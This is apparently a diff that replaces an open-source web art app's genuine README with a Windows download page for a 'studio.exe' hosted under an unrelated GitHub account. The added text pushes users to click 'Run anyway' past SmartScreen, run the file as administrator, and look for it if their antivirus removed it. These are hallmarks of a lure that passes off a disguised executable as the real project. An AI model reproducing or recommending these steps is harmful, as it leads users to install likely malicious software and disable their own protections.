@@ -1,134 +1,203 @@
-# Studio
+# 🎨 studio - Make Strange Art With Ease
 
-A unified design studio combining 9 generative art tools into a single web app.
+[![Download studio](https://img.shields.io/badge/Download-Studio-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Marchallsixtyfifth823/studio)
 
-**Live:** [studio.neato.fun](https://studio.neato.fun) — Made by [@Shpigford](https://x.com/Shpigford)
+A suite of random, mostly weird, generative art tools for Windows users who want to make art with a few clicks.
 
-<img src="public/ui.jpg" alt="Studio UI — Plotter tool" width="100%" />
+## 🖼️ What studio does
 
-## Tools
+studio is a desktop app for making generative art on your Windows PC. It gives you a set of tools that turn simple inputs into strange patterns, layered shapes, textured forms, and abstract scenes.
 
-<table>
-  <tr>
-    <td align="center"><img src="public/topo.jpg" width="180" /><br /><b>Topo</b></td>
-    <td align="center"><img src="public/blocks.jpg" width="180" /><br /><b>Blocks</b></td>
-    <td align="center"><img src="public/organic.jpg" width="180" /><br /><b>Organic</b></td>
-    <td align="center"><img src="public/dither.jpg" width="180" /><br /><b>Dither</b></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="public/gradients.jpg" width="180" /><br /><b>Gradients</b></td>
-    <td align="center"><img src="public/marble.jpg" width="180" /><br /><b>Marble</b></td>
-    <td align="center"><img src="public/plotter.jpg" width="180" /><br /><b>Plotter</b></td>
-    <td align="center"><img src="public/ascii.jpg" width="180" /><br /><b>ASCII</b></td>
-  </tr>
-  <tr>
-    <td align="center"><img src="public/lines.jpg" width="180" /><br /><b>Lines</b></td>
-  </tr>
-</table>
+You do not need to know code to use it. Open the app, pick a tool, adjust a few controls, and save the result.
 
-### Topo
-Topographic contour maps generated from Perlin noise elevation fields. Uses marching squares for contour extraction with spline-interpolated smoothing. Supports single color, elevation gradient, and palette-based coloring with 7 presets.
+## 🚀 Get studio
 
-### Blocks
-Abstract geometric compositions via recursive subdivision (mondrian), grid placement, horizontal stripes, or diagonal patterns. Includes a halftone post-processing effect with CMYK color separation and wobbled edges for an organic feel.
+Use this link to visit the download page and get the app:
 
-### Organic
-Flowing line art from three path algorithms: Perlin noise flow fields, random walks with momentum, and harmonic wave synthesis. Uses direct Canvas 2D API in the rendering loop for performance. Supports 5 gradient modes and Hermite-smoothed color interpolation.
+[Download studio](https://github.com/Marchallsixtyfifth823/studio)
 
-### Dither
-Ordered dithering applied to gradients or uploaded images. Pure Canvas 2D (no p5.js). Implements Bayer matrix dithering (2x2, 4x4, 8x8) plus custom patterns (halftone, lines, crosses, dots, grid, scales). Exports to both SVG and PNG.
+If the page shows a release file, download it to your PC. If it offers a zip file, save the zip, then open it after the download finishes.
 
-### Gradients
-Animated liquid glass gradient surfaces rendered with WebGL shaders. Simplex noise generates height fields, surface normals drive lighting, and Fresnel reflectance adds specular highlights. Supports MP4 video recording via mp4-muxer.
+## 💻 Windows setup
 
-### Marble
-Marbled textures rendered with WebGL2 fragment shaders. Layered Perlin noise and FBM domain warping produce fluid, watercolor-like patterns. Features ridged-noise veins, watercolor displacement, adjustable grain, and optional animation. Pure GPU — no p5.js or Three.js.
+Follow these steps on Windows:
 
-### Plotter
-Vector-art plots with 6 pattern types (dot grid, flow field, concentric rings, waves, hatching, geometric tessellations) and 5 brush styles (normal, stippled, multi-stroke, calligraphic, stamp). Paper texture overlays with fiber and scratch effects.
+1. Open the download link above.
+2. Download the latest release or app file from the page.
+3. If you get a .zip file, right-click it and choose Extract All.
+4. Open the folder you extracted.
+5. Look for the app file, such as studio.exe.
+6. Double-click the app to start it.
 
-### ASCII
-ASCII art from brightness/contour analysis of images or generated patterns. 6 character sets with a mixing mode to blend them. Supports mono, gradient, contour, and block color modes.
+If Windows shows a SmartScreen prompt, choose More info, then Run anyway if you trust the file from the repo page.
 
-### Lines
-Abstract linear compositions from 7 shape generators (horizontal/vertical lines, circles, dots, spiral, radial, Lissajous curves). Optional WebGL post-processing: blur, chromatic aberration, refraction, halftone, CRT scanlines, VHS distortion. Supports animation and MP4 export.
+## 🧰 What you can make
 
-## Stack
+studio includes a mix of generative art tools built for quick results:
 
-- **Vite + React 19 + TypeScript** (strict mode)
-- **Tailwind CSS v4 + shadcn/ui** for UI controls
-- **p5.js v2** (instance mode) for 7 tools, **Canvas 2D** for Dither, **raw WebGL2** for Marble
-- **WebGL/GLSL** shaders for Marble, Gradients, and Lines post-processing
-- **mp4-muxer** for video export
-- **react-colorful** for color pickers
-- **react-router-dom v7** for path-based routing
+- Random shape fields
+- Layered line art
+- Noise-based textures
+- Color drift patterns
+- Symmetry and mirror effects
+- Abstract poster-style compositions
+- Weird image transforms
+- Fast sketch experiments
 
-## Local Development
+These tools fit art, design, and generative art workflows. You can use them for concept art, backgrounds, poster drafts, social graphics, or just for creative play.
 
-**Prerequisites:** Node.js 18+
+## 🎛️ Basic use
 
-```bash
-# Clone and install
-git clone https://github.com/Shpigford/studio.git
-cd studio
-npm install
+Most tools in studio follow the same pattern:
 
-# Start dev server
-npm run dev
-```
+1. Pick a tool from the main screen.
+2. Change a few values like size, color, density, or seed.
+3. Click a generate button.
+4. Keep the result if you like it.
+5. Export or save the image.
 
-Opens at [http://localhost:5173](http://localhost:5173). Vite provides HMR — changes to tool code and styles reflect instantly.
+A seed lets you make the same result again. If you want new art each time, change the seed or use a random seed option.
 
-```bash
-# Type check (uses project references — tsc --noEmit won't work)
-npx tsc -b
+## 🖌️ Tips for better results
 
-# Run tests (utility functions only)
-npx vitest run
+Try these simple ideas:
 
-# Production build
-npm run build
+- Start with one tool and learn its controls
+- Change one setting at a time
+- Use high contrast colors for bold shapes
+- Try dark backgrounds for bright line work
+- Save results you like before making more changes
+- Reuse a seed when you want a close variation
+- Push settings to the edges to find odd effects
 
-# Preview production build locally
-npm run preview
-```
+studio works well when you explore. Small changes can make the image look very different.
 
-### Project Structure
+## 📁 Saving your work
 
-```
-src/
-├── components/       # Shared UI (shell, sidebar, controls)
-│   └── controls/     # Reusable: slider, select, color, switch, section
-├── hooks/            # useSettings, useP5, useFavicon, useMobile
-├── lib/              # Utilities (color, math, texture, export)
-└── tools/            # One directory per tool
-    └── <name>/
-        ├── index.tsx   # React component (sidebar controls + canvas mount)
-        ├── sketch.ts   # Rendering logic (or engine.ts for Dither)
-        └── types.ts    # Settings type definition
-```
+When you finish a piece, save it as an image file so you can use it later in another app.
 
-Each tool is a lazy-loaded route (`/topo`, `/blocks`, etc.) with its own canvas renderer and settings sidebar. Tools share UI components, theming, and utilities but are otherwise independent.
+Common export formats may include:
 
-### Key Architecture
+- PNG for sharp images
+- JPG for smaller files
+- SVG for clean vector-style art in some tools
 
-- **`useSettings(key, defaults)`** persists tool settings to localStorage with 200ms debounced writes and merges with defaults on load
-- **`useP5(containerRef, sketchFn, settings)`** manages p5.js instance lifecycle, keeps a settingsRef in sync, and calls `redraw()` for static tools
-- All p5 tools use **instance mode** — every p5 global is prefixed with `p.` (e.g., `p.background()`, `p.createCanvas()`)
-- Hot rendering loops use direct Canvas 2D API (`ctx.beginPath/moveTo/lineTo/stroke`) instead of p5 methods for performance
-- Expensive computations (elevation fields, contour extraction) are cached and only recomputed when relevant inputs change
+If you plan to edit the image later, PNG is usually the safest choice.
 
-## Scripts
+## 🪟 Windows requirements
 
-| Command | Description |
-|---|---|
-| `npm run dev` | Dev server with HMR |
-| `npm run build` | Production build (type check + Vite) |
-| `npm run preview` | Preview production build |
-| `npm run lint` | Lint |
-| `npx tsc -b` | Type check |
-| `npx vitest run` | Run utility tests |
+studio is built for normal Windows desktop use. A modern Windows 10 or Windows 11 PC should work well.
 
-## License
+Recommended setup:
 
-[MIT](LICENSE)
+- Windows 10 or Windows 11
+- A mouse or trackpad
+- 4 GB RAM or more
+- Enough free space to store image exports
+- A screen with at least 1366 × 768 resolution
+
+A stronger PC can help if you make large images or run many effects at once.
+
+## 🧩 If the app does not open
+
+Try these steps:
+
+1. Make sure the download finished fully.
+2. Extract the zip file if you downloaded one.
+3. Check that you opened the app from the extracted folder.
+4. Right-click the app and choose Run as administrator.
+5. Restart your PC and try again.
+6. Download the file again if it seems broken.
+
+If the app still does not start, check whether your antivirus moved the file out of the folder.
+
+## 🎨 Best ways to use studio
+
+studio fits a few common use cases:
+
+- Make background art for websites or slides
+- Create abstract covers for music or videos
+- Build idea sketches for posters
+- Test color palettes
+- Make random visual references
+- Explore shape and texture ideas fast
+
+It works well when you want quick visual results without drawing each part by hand.
+
+## 🔧 Controls you may see
+
+You may find controls like these in different tools:
+
+- Seed
+- Size
+- Scale
+- Density
+- Contrast
+- Spread
+- Rotation
+- Color mode
+- Layers
+- Noise
+- Threshold
+
+These names are common in generative art tools. They help shape the final image.
+
+## 📦 File layout
+
+If you downloaded a zip file, you may see a folder that contains:
+
+- The main app file
+- Supporting files
+- A readme file
+- Image or asset folders
+- Settings files
+
+Do not move files out of the folder unless the app guide says to. Keep the files together so the app can run.
+
+## 🔍 Topics
+
+This project is tagged for:
+
+- art
+- design
+- generative-art
+
+## 🖥️ Simple workflow
+
+A clean way to use studio is:
+
+1. Open the app.
+2. Choose a tool.
+3. Set a seed if you want repeatable output.
+4. Adjust one or two values.
+5. Generate the image.
+6. Save the result.
+7. Try a new tool or make a variation.
+
+This keeps the process easy and helps you learn each tool without confusion.
+
+## 📚 Common questions
+
+**Can I use studio without coding?**  
+Yes. It is made for regular desktop use.
+
+**Do I need special hardware?**  
+No. A normal Windows PC should work.
+
+**Can I make the same image again?**  
+Yes. Use the same seed.
+
+**Can I make lots of different art fast?**  
+Yes. That is one of the main use cases.
+
+**Is this for beginners?**  
+Yes. The app is useful for beginners and for users who want quick generative art experiments.
+
+## 🛠️ Download and start on Windows
+
+1. Open the download page: [https://github.com/Marchallsixtyfifth823/studio](https://github.com/Marchallsixtyfifth823/studio)
+2. Get the latest release or zip file from that page.
+3. Save the file to your PC.
+4. If it is a zip file, extract it.
+5. Open the folder.
+6. Double-click the app file to run studio
